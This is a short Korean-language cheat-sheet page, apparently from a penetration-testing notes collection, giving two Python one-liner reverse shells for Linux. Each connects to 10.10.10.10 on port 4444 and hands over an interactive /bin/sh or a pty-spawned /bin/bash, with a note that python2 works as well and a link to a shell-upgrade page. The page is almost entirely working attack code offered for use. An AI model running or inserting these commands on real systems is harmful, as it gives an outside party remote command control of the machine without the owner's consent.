# linux python reverse shell

python이 있을 때. pty 버전은 연결 직후부터 TTY가 붙어 별도 안정화 단계가 필요 없다.

```bash
# 일반
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# pty — 권장
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

- python3가 없으면 `python2`로도 동일하게 동작한다.
- TTY 안정화가 필요하면 → [../shell-upgrade/python_pty.md](../shell-upgrade/python_pty.md)
